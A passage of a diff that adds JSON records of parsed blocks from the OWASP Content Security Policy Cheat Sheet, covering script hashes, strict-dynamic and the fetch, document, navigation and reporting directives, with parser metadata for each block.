+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00067",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 67,
+    "file_format": "MARKDOWN",
+    "block_type": "heading",
+    "text_content": "### Hashes",
+    "text_hash": "abebcbc8103f3e97cb5ab6ae935a7331703dfaa6f469d65e34c8294b2d6eb3eb",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 170,
+      "end_line": 170
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "Strict CSP",
+      "Hashes"
+    ],
+    "heading_level": 3,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00068",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 68,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "When inline scripts are required, the `script-src 'hash_algo-hash'` is another option for allowing only specific scripts to execute.",
+    "text_hash": "46f37ce13b117f3e83f188de2c0b175bd3887ce10cd159b73b107610bac87570",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 172,
+      "end_line": 172
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "Strict CSP",
+      "Hashes"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00069",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 69,
+    "file_format": "MARKDOWN",
+    "block_type": "code",
+    "text_content": "```text\nContent-Security-Policy: script-src 'sha256-V2kaaafImTjn8RQTWZmF4IfGfQ7Qsqsw9GWaFjzFNPg='\n```",
+    "text_hash": "0ad004e9e858b2dec2c72cd10f468ee53c04a3f9e356f4a8d7dd4ad7a503ce65",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 174,
+      "end_line": 176
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "Strict CSP",
+      "Hashes"
+    ],
+    "heading_level": null,
+    "code_language": "text",
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00070",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 70,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "To get the hash, look at Google Chrome developer tools for violations like this:",
+    "text_hash": "d22282350d5eb209aa2ff0b7936023a86d7cf73a1ec011393cf335001a0afecb",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 178,
+      "end_line": 178
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "Strict CSP",
+      "Hashes"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00071",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 71,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "> ❌ Refused to execute inline script because it violates the following Content Security Policy directive: \"...\" Either the 'unsafe-inline' keyword, a hash (__'sha256-V2kaaafImTjn8RQTWZmF4IfGfQ7Qsqsw9GWaFjzFNPg='__), or a nonce...",
+    "text_hash": "92cc69f07e8eee47e68b3ad64b4672e92a45a25b42a1806ab5e76a0f68f8695f",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 180,
+      "end_line": 180
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "Strict CSP",
+      "Hashes"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00072",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 72,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "You can also use this [hash generator](https://report-uri.com/home/hash). This is a great [example](https://csp.withgoogle.com/docs/faq.html#static-content) of using hashes.",
+    "text_hash": "06417585a32d42d3ddb46a9763f9a9e483fd9315f6dcc86c4ba3624748800b52",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 182,
+      "end_line": 182
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "Strict CSP",
+      "Hashes"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00073",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 73,
+    "file_format": "MARKDOWN",
+    "block_type": "heading",
+    "text_content": "#### Note",
+    "text_hash": "ad8edba4c7789591022c73a8bd55a616580fb364fb3e18eaad9e0a59a894ac04",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 184,
+      "end_line": 184
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "Strict CSP",
+      "Hashes",
+      "Note"
+    ],
+    "heading_level": 4,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00074",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 74,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "Using hashes can be a risky approach. If you change *anything* inside the script tag (even whitespace) by, e.g., formatting your code, the hash will be different, and the script won't render.",
+    "text_hash": "44bc1fa841b39863e865059978e97e41f1577647ff30dae427d074deb629348e",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 186,
+      "end_line": 186
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "Strict CSP",
+      "Hashes",
+      "Note"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00075",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 75,
+    "file_format": "MARKDOWN",
+    "block_type": "heading",
+    "text_content": "### strict-dynamic",
+    "text_hash": "2d1b25624ff006fdf717e0c9984dcd717efa346a4c9a364d1a7408899bb3b4e1",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 188,
+      "end_line": 188
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "Strict CSP",
+      "strict-dynamic"
+    ],
+    "heading_level": 3,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00076",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 76,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "The `strict-dynamic` directive can be used as part of a Strict CSP in combination with either hashes or nonces.",
+    "text_hash": "404df24dafcaf8d5c5525719fe7c8c44d042ac8b6458da842e6c6a22b56fb1a6",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 190,
+      "end_line": 190
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "Strict CSP",
+      "strict-dynamic"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00077",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 77,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "If a script block which has either the correct hash or nonce is creating additional DOM elements and executing JS inside of them, `strict-dynamic` tells the browser to trust those elements as well without having to explicitly add nonces or hashes for each one.",
+    "text_hash": "43974648b038acda9763eb7d7cd78b9a0b1f607d5d91829a6f994284ead0c4eb",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 192,
+      "end_line": 192
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "Strict CSP",
+      "strict-dynamic"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00078",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 78,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "Note that while `strict-dynamic` is a CSP level 3 feature, CSP level 3 is very widely supported in common, modern browsers.",
+    "text_hash": "0742ac2d205c415a0c23779e8b5c1a6a1e89afac75280aea34e5bef82149f5cd",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 194,
+      "end_line": 194
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "Strict CSP",
+      "strict-dynamic"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00079",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 79,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "For more details, check out [strict-dynamic usage](https://w3c.github.io/webappsec-csp/#strict-dynamic-usage).",
+    "text_hash": "ed8ca7adad4766d0f74f22e2c0ea93f9b829804a0221be0ad0b34e8809a6afaf",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 196,
+      "end_line": 196
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "Strict CSP",
+      "strict-dynamic"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00080",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 80,
+    "file_format": "MARKDOWN",
+    "block_type": "heading",
+    "text_content": "## Detailed CSP Directives",
+    "text_hash": "3346b7918b6e7aa35f0510dea67b57be72a81c0b872ce59e642f06889e01b3ce",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 198,
+      "end_line": 198
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "Detailed CSP Directives"
+    ],
+    "heading_level": 2,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00081",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 81,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "Multiple types of directives exist that allow the developer to control the flow of the policies granularly. Note that creating a non-Strict policy that is too granular or permissive is likely to lead to bypasses and a loss of protection.",
+    "text_hash": "2d2674e5a94155651ceb0b0795540e04d976c29ffade5e05b1cf024fa6541a5f",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 200,
+      "end_line": 200
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "Detailed CSP Directives"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00082",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 82,
+    "file_format": "MARKDOWN",
+    "block_type": "heading",
+    "text_content": "### Fetch Directives",
+    "text_hash": "6260f425121b44df3536b8ef7eeb6f977e843bc97e298e6cc27ad8d1de9e335d",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 202,
+      "end_line": 202
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "Detailed CSP Directives",
+      "Fetch Directives"
+    ],
+    "heading_level": 3,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00083",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 83,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "Fetch directives tell the browser the locations to trust and load resources from.",
+    "text_hash": "d397abc81109f93b7d0e415f902d36f346c436aaabeae946c46ff4d671c51e9d",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 204,
+      "end_line": 204
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "Detailed CSP Directives",
+      "Fetch Directives"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00084",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 84,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "Most fetch directives have a certain [fallback list specified in w3](https://www.w3.org/TR/CSP3/#directive-fallback-list). This list allows for granular control of the source of scripts, images, files, etc.",
+    "text_hash": "51a7925c03e876c4d38828e3b6b9359b69f0d605f4a5cda97f94dbd46758943f",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 206,
+      "end_line": 206
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "Detailed CSP Directives",
+      "Fetch Directives"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00085",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 85,
+    "file_format": "MARKDOWN",
+    "block_type": "list",
+    "text_content": "- `child-src` allows the developer to control nested browsing contexts and worker execution contexts.\n- `connect-src` provides control over fetch requests, XHR, eventsource, beacon and websockets connections.\n- `font-src` specifies which URLs to load fonts from.\n- `img-src` specifies the URLs that images can be loaded from.\n- `manifest-src` specifies the URLs that application manifests may be loaded from.\n- `media-src` specifies the URLs from which video, audio and text track resources can be loaded from.\n- `prefetch-src` was an experimental directive for prefetch/prerender resource URLs. It was __removed from the CSP Level 3 specification__ and is ignored by modern browsers — do not rely on it for defense. Constrain scripts, styles, and default fetches with the standard fetch directives instead.\n- `object-src` specifies the URLs from which plugins can be loaded from.\n- `script-src` specifies the locations from which a script can be executed from. It is a fallback directive for other script-like directives.\n    - `script-src-elem` controls the location from which execution of script requests and blocks can occur.\n    - `script-src-attr` controls the execution of event handlers.\n- `style-src` controls from where styles get applied to a document. This includes `<link>` elements, `@import` rules, and requests originating from a `Link` HTTP response header field.\n    - `style-src-elem` controls styles except for inline attributes.\n    - `style-src-attr` controls styles attributes.\n- `default-src` is a fallback directive for the other fetch directives. Directives that are specified have no inheritance, yet directives that are not specified will fall back to the value of `default-src`.\n",
+    "text_hash": "53e734c2dd5ff4a3fc972c6201557fe8ff3e6b0a2dfdb2b5cac63de1e3430b6c",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 208,
+      "end_line": 223
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "Detailed CSP Directives",
+      "Fetch Directives"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00086",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 86,
+    "file_format": "MARKDOWN",
+    "block_type": "heading",
+    "text_content": "### Document Directives",
+    "text_hash": "5d1310322ee795c80e64ce1dad240db8a9c3b9a9a89c0b294e715f2014c6ed81",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 224,
+      "end_line": 224
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "Detailed CSP Directives",
+      "Document Directives"
+    ],
+    "heading_level": 3,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00087",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 87,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "Document directives instruct the browser about the properties of the document to which the policies will apply to.",
+    "text_hash": "7ea783d5a5cbd99686df9ab61ba3460f86d19321761fdf75fd178de4dc0f0836",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 226,
+      "end_line": 226
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "Detailed CSP Directives",
+      "Document Directives"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00088",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 88,
+    "file_format": "MARKDOWN",
+    "block_type": "list",
+    "text_content": "- `base-uri` specifies the possible URLs that the `<base>` element can use.\n- `plugin-types` has been [removed from the CSP specification](https://bugs.webkit.org/show_bug.cgi?id=220724). Do not rely on it to enforce content types. Use `object-src 'none'` when embedded objects are unnecessary, as in the [strict policy examples](#strict-policy).\n- `sandbox` restricts a page's actions such as submitting forms.\n    - Only applies when used with the request header `Content-Security-Policy`.\n    - Not specifying a value for the directive activates all of the sandbox restrictions. `Content-Security-Policy: sandbox;`\n    - [Sandbox syntax](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox#Syntax)\n",
+    "text_hash": "590e6b370202be048aac397270168b463f893c99742043c36f9ab136492bd1e1",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 228,
+      "end_line": 234
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "Detailed CSP Directives",
+      "Document Directives"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00089",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 89,
+    "file_format": "MARKDOWN",
+    "block_type": "heading",
+    "text_content": "### Navigation Directives",
+    "text_hash": "e2004b050da9c7f2e063d2c34ea2880a1e716464a4e672dab17c462dddaa21ef",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 235,
+      "end_line": 235
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "Detailed CSP Directives",
+      "Navigation Directives"
+    ],
+    "heading_level": 3,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00090",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 90,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "Navigation directives instruct the browser about the locations that the document can navigate to or be embedded from.",
+    "text_hash": "e8e49f797df86d7733f9f59310134d183ca5074a426f4d4a92756730ec624579",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 237,
+      "end_line": 237
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "Detailed CSP Directives",
+      "Navigation Directives"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00091",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 91,
+    "file_format": "MARKDOWN",
+    "block_type": "list",
+    "text_content": "- `form-action` restricts the URLs which the forms can submit to.\n- `frame-ancestors` restricts the URLs that can embed the requested resource inside of  `<frame>`, `<iframe>`, `<object>`, `<embed>`, or `<applet>` elements.\n    - If this directive is specified in a `<meta>` tag, the directive is ignored.\n    - This directive doesn't fallback to the `default-src` directive.\n    - `X-Frame-Options` is rendered obsolete by this directive and is ignored by the user agents.\n",
+    "text_hash": "eacc90d23767bdd38c41e538de5b0aae7c356369bd9b4f6c0763b69392a83b82",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 239,
+      "end_line": 244
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "Detailed CSP Directives",
+      "Navigation Directives"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00092",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 92,
+    "file_format": "MARKDOWN",
+    "block_type": "heading",
+    "text_content": "### Reporting Directives",
+    "text_hash": "2cf4ac3dd2789da1bdba95117603a43c32a53e1f8cd5743f9f9b54b46c9cdde0",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 245,
+      "end_line": 245
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "Detailed CSP Directives",
+      "Reporting Directives"
+    ],
+    "heading_level": 3,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00093",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 93,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "Reporting directives deliver violations of prevented behaviors to specified locations. These directives serve no purpose on their own and are dependent on other directives.",
+    "text_hash": "5c1ef3066fb8495e5648e567fc62ef498d210ae17ac73a5cc08b5af36fe27d95",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 247,
+      "end_line": 247
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "Detailed CSP Directives",
+      "Reporting Directives"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00094",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 94,
+    "file_format": "MARKDOWN",
+    "block_type": "list",
+    "text_content": "- `report-to` (CSP Level 3, used together with the [Reporting API](https://developer.mozilla.org/en-US/docs/Web/API/Reporting_API)) is the __primary, current__ reporting directive. It references an endpoint name defined in the [Reporting-Endpoints response header](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Reporting-Endpoints#syntax), which uses comma-separated `name=\"URL\"` entries. The legacy `Report-To` header uses JSON instead.\n    - [MDN report-to documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/report-to)\n- `report-uri` is __deprecated__ by CSP Level 3 in favor of `report-to`. It takes a URI that reports are sent to.\n    - Format: `Content-Security-Policy: report-uri https://example.com/csp-reports`\n",
+    "text_hash": "daeae1ff8ca4d2b03dbfde5c700f074bed048768bb057b347db0a0a50d3e947d",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 249,
+      "end_line": 253
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "Detailed CSP Directives",
+      "Reporting Directives"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00095",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 95,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "For backward compatibility, declare both directives in conjunction. Browsers that support `report-to` will use it and ignore `report-uri`; older browsers fall back to `report-uri`. Once support for legacy browsers is no longer required, `report-uri` can be removed.",
+    "text_hash": "d49cddaa9e37ffb2125c5b668e139032063a28a21fe24d479ea2655960e442e4",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 254,
+      "end_line": 254
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "Detailed CSP Directives",
+      "Reporting Directives"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00096",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 96,
+    "file_format": "MARKDOWN",
+    "block_type": "heading",
+    "text_content": "### Special Directive Sources",
+    "text_hash": "3028a9564bf0d314299121e7736b74d3ba23a8a172c62ebdd698c0383d9774af",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 256,
+      "end_line": 256
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "Detailed CSP Directives",
+      "Special Directive Sources"
+    ],
+    "heading_level": 3,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_4d5e2f4d1c42_b00097",
+    "document_id": "doc_owasp_a03_content_security_policy_cheat_sheet",
+    "version_id": "ver_4d5e2f4d1c42",
+    "block_idx": 97,
+    "file_format": "MARKDOWN",
+    "block_type": "table",
+    "text_content": "| Value            | Description                                                                 |\n|------------------|-----------------------------------------------------------------------------|\n| 'none'           | No URLs match.                                                              |\n| 'self'           | Refers to the origin site with the same scheme and port number.             |\n| 'unsafe-inline'  | Allows the usage of inline scripts or styles.                               |\n| 'unsafe-eval'    | Allows the usage of eval in scripts.                                        |",
+    "text_hash": "aa6812d8eea9a11147db257f447b8689a988d0e588383a1c6eaade1976b8739c",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 258,
+      "end_line": 263
+    },
+    "heading_path": [
+      "Content Security Policy Cheat Sheet",
+      "Detailed CSP Directives",
+      "Special Directive Sources"
+    ],
+    "heading_level": null,
